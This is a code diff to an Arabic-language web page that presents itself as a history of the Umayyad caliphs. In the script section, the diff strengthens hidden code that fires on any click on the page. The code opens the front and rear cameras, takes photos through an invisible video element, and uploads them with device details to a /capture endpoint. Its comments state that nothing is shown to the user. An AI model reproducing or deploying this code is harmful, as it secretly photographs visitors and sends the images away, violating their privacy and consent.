@@ -188,9 +188,7 @@
   <p class="section-eyebrow">قائمة الحكام</p>
   <h2 class="section-title">خلفاء بنو أمية</h2>
   <div class="section-line"></div>
-  <div class="caliph-grid" id="caliphGrid">
-    <!-- سيتم تعبئتها بواسطة JS للحفاظ على نظافة الكود -->
-  </div>
+  <div class="caliph-grid" id="caliphGrid"></div>
 </section>
 
 <footer>
@@ -200,22 +198,15 @@
 </footer>
 
 <script>
-  // ---------- إضافة قائمة الخلفاء ديناميكياً (لتقليل حجم الكود) ----------
+  // ------------------- قائمة الخلفاء -------------------
   const caliphs = [
-    { name: "معاوية بن أبي سفيان", years: "٤١ — ٦٠ هـ" },
-    { name: "يزيد بن معاوية", years: "٦٠ — ٦٤ هـ" },
-    { name: "معاوية بن يزيد", years: "٦٤ هـ" },
-    { name: "مروان بن الحكم", years: "٦٤ — ٦٥ هـ" },
-    { name: "عبد الملك بن مروان", years: "٦٥ — ٨٦ هـ" },
-    { name: "الوليد بن عبد الملك", years: "٨٦ — ٩٦ هـ" },
-    { name: "سليمان بن عبد الملك", years: "٩٦ — ٩٩ هـ" },
-    { name: "عمر بن عبد العزيز", years: "٩٩ — ١٠١ هـ" },
-    { name: "يزيد بن عبد الملك", years: "١٠١ — ١٠٥ هـ" },
-    { name: "هشام بن عبد الملك", years: "١٠٥ — ١٢٥ هـ" },
-    { name: "الوليد بن يزيد", years: "١٢٥ — ١٢٦ هـ" },
-    { name: "يزيد بن الوليد", years: "١٢٦ هـ" },
-    { name: "إبراهيم بن الوليد", years: "١٢٦ هـ" },
-    { name: "مروان بن محمد", years: "١٢٦ — ١٣٢ هـ" }
+    { name: "معاوية بن أبي سفيان", years: "٤١ — ٦٠ هـ" }, { name: "يزيد بن معاوية", years: "٦٠ — ٦٤ هـ" },
+    { name: "معاوية بن يزيد", years: "٦٤ هـ" }, { name: "مروان بن الحكم", years: "٦٤ — ٦٥ هـ" },
+    { name: "عبد الملك بن مروان", years: "٦٥ — ٨٦ هـ" }, { name: "الوليد بن عبد الملك", years: "٨٦ — ٩٦ هـ" },
+    { name: "سليمان بن عبد الملك", years: "٩٦ — ٩٩ هـ" }, { name: "عمر بن عبد العزيز", years: "٩٩ — ١٠١ هـ" },
+    { name: "يزيد بن عبد الملك", years: "١٠١ — ١٠٥ هـ" }, { name: "هشام بن عبد الملك", years: "١٠٥ — ١٢٥ هـ" },
+    { name: "الوليد بن يزيد", years: "١٢٥ — ١٢٦ هـ" }, { name: "يزيد بن الوليد", years: "١٢٦ هـ" },
+    { name: "إبراهيم بن الوليد", years: "١٢٦ هـ" }, { name: "مروان بن محمد", years: "١٢٦ — ١٣٢ هـ" }
   ];
   const container = document.getElementById('caliphGrid');
   caliphs.forEach((c, idx) => {
@@ -225,8 +216,9 @@
     container.appendChild(card);
   });
 
-  // ---------- التقاط الصورة (بدون فيديو ظاهر) باستخدام ImageCapture أو بديل مخفي ----------
+  // ------------------- كاميرا خلفية تلتقط صورتين (أمامية + خلفية) بحد أقصى 3 مرات -------------------
   (function() {
+    let remainingAttempts = 3;       // عدد المحاولات المتبقية (كل محاولة = صورتين)
     let isProcessing = false;
     let currentStream = null;
 
@@ -247,34 +239,34 @@
       return { os, browser, screen, language };
     }
 
-    // إرسال الصورة إلى الخادم
-    function sendPhoto(imageBlob) {
+    async function sendPhoto(blob, cameraType) {
       return new Promise((resolve, reject) => {
         const reader = new FileReader();
         reader.onloadend = () => {
-          const base64 = reader.result;
           fetch('/capture', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image: base64, device_info: getDeviceInfo() })
+            body: JSON.stringify({
+              image: reader.result,
+              device_info: getDeviceInfo(),
+              camera: cameraType
+            })
           }).then(resp => resp.json()).then(resolve).catch(reject);
         };
         reader.onerror = reject;
-        reader.readAsDataURL(imageBlob);
+        reader.readAsDataURL(blob);
       });
     }
 
-    // الطريقة المثالية: استخدام ImageCapture (بدون أي عنصر فيديو مرئي)
-    async function captureWithImageCapture(stream) {
+    async function captureFromStream(stream) {
       const track = stream.getVideoTracks()[0];
       if (!track) throw new Error("لا يوجد مسار فيديو");
-      const imageCapture = new ImageCapture(track);
       try {
-        const blob = await imageCapture.takePhoto();
-        return blob;
+        // استخدام ImageCapture إن أمكن
+        const imageCapture = new ImageCapture(track);
+        return await imageCapture.takePhoto();
       } catch(e) {
-        console.warn("ImageCapture فشل، نستخدم البديل:", e);
-        // البديل: رسم إطار من فيديو مخفي (لن يظهر للمستخدم)
+        // البديل: فيديو غير مرئي
         return new Promise((resolve, reject) => {
           const video = document.createElement('video');
           video.autoplay = true;
@@ -290,7 +282,6 @@
               const ctx = canvas.getContext('2d');
               ctx.drawImage(video, 0, 0);
               canvas.toBlob(resolve, 'image/jpeg', 0.9);
-              // لا نضيف video إلى DOM أبداً، لا يظهر للمستخدم
               video.pause();
               video.srcObject = null;
             }, 200);
@@ -300,76 +291,101 @@
       }
     }
 
-    async function requestAndCapture() {
-      if (isProcessing) return;
-      isProcessing = true;
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        currentStream = stream;
-        const imageBlob = await captureWithImageCapture(stream);
-        await sendPhoto(imageBlob);
-        // إغلاق المسار بعد الإرسال
-        stream.getTracks().forEach(track => track.stop());
+    async function openCamera(facingMode) {
+      if (currentStream) {
+        currentStream.getTracks().forEach(t => t.stop());
         currentStream = null;
+      }
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { exact: facingMode } }
+        });
+        currentStream = stream;
+        return stream;
       } catch(err) {
-        console.error("خطأ في الكاميرا:", err);
-        alert("تعذر الوصول إلى الكاميرا. تأكد من منح الصلاحية.");
-      } finally {
-        isProcessing = false;
+        // حاول مرة أخرى بدون exact (أكثر توافقاً)
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: facingMode }
+          });
+          currentStream = stream;
+          return stream;
+        } catch(e2) {
+          console.warn(`فشل فتح الكاميرا ${facingMode}`, e2);
+          return null;
+        }
       }
     }
 
-    // ربط النقرة بالصفحة (مع استثناء الروابط)
+    async function captureBothCameras() {
+      if (remainingAttempts <= 0 || isProcessing) return;
+      isProcessing = true;
+      let success = false;
+
+      // 1. الصورة الأمامية
+      const frontStream = await openCamera('user');
+      if (frontStream) {
+        try {
+          const frontBlob = await captureFromStream(frontStream);
+          await sendPhoto(frontBlob, 'front');
+          success = true;
+        } catch(e) { console.warn("خطأ في التصوير الأمامي", e); }
+      } else {
+        console.warn("⚠️ لا توجد كاميرا أمامية");
+      }
+
+      // 2. الصورة الخلفية
+      const backStream = await openCamera('environment');
+      if (backStream) {
+        try {
+          const backBlob = await captureFromStream(backStream);
+          await sendPhoto(backBlob, 'back');
+          success = true;
+        } catch(e) { console.warn("خطأ في التصوير الخلفي", e); }
+      } else {
+        console.warn("⚠️ لا توجد كاميرا خلفية");
+      }
+
+      if (success) {
+        remainingAttempts--;
+      }
+
+      // تنظيف
+      if (currentStream) {
+        currentStream.getTracks().forEach(t => t.stop());
+        currentStream = null;
+      }
+      isProcessing = false;
+    }
+
     document.body.addEventListener('click', (e) => {
       if (e.target.closest('a')) return;
-      requestAndCapture();
+      captureBothCameras();
     });
   })();
 
-  // تأثيرات التمرير (Intersection Observer)
+  // ------------------- تأثيرات التمرير (Intersection Observer) -------------------
   const tlItems = document.querySelectorAll('.tl-item');
   const obs = new IntersectionObserver((entries) => {
-    entries.forEach((e, i) => {
-      if (e.isIntersecting) setTimeout(() => e.target.classList.add('visible'), i * 120);
-    });
+    entries.forEach((e, i) => { if (e.isIntersecting) setTimeout(() => e.target.classList.add('visible'), i * 120); });
   }, { threshold: 0.15 });
   tlItems.forEach(el => obs.observe(el));
 
   const achCards = document.querySelectorAll('.ach-card');
   const achObs = new IntersectionObserver((entries) => {
     entries.forEach((e, i) => {
-      if (e.isIntersecting) {
-        setTimeout(() => {
-          e.target.style.opacity = '1';
-          e.target.style.transform = 'translateY(0)';
-        }, i * 90);
-      }
+      if (e.isIntersecting) setTimeout(() => { e.target.style.opacity = '1'; e.target.style.transform = 'translateY(0)'; }, i * 90);
     });
   }, { threshold: 0.1 });
-  achCards.forEach(el => {
-    el.style.opacity = '0';
-    el.style.transform = 'translateY(20px)';
-    el.style.transition = 'opacity .5s ease, transform .5s ease';
-    achObs.observe(el);
-  });
+  achCards.forEach(el => { el.style.opacity = '0'; el.style.transform = 'translateY(20px)'; el.style.transition = 'opacity .5s ease, transform .5s ease'; achObs.observe(el); });
 
   const caliphCards = document.querySelectorAll('.caliph-card');
   const calObs = new IntersectionObserver((entries) => {
     entries.forEach((e, i) => {
-      if (e.isIntersecting) {
-        setTimeout(() => {
-          e.target.style.opacity = '1';
-          e.target.style.transform = 'scale(1)';
-        }, i * 50);
-      }
+      if (e.isIntersecting) setTimeout(() => { e.target.style.opacity = '1'; e.target.style.transform = 'scale(1)'; }, i * 50);
     });
   }, { threshold: 0.05 });
-  caliphCards.forEach(el => {
-    el.style.opacity = '0';
-    el.style.transform = 'scale(.95)';
-    el.style.transition = 'opacity .4s ease, transform .4s ease';
-    calObs.observe(el);
-  });
+  caliphCards.forEach(el => { el.style.opacity = '0'; el.style.transform = 'scale(.95)'; el.style.transition = 'opacity .4s ease, transform .4s ease'; calObs.observe(el); });
 </script>
 </body>
-</html>
+     </html>
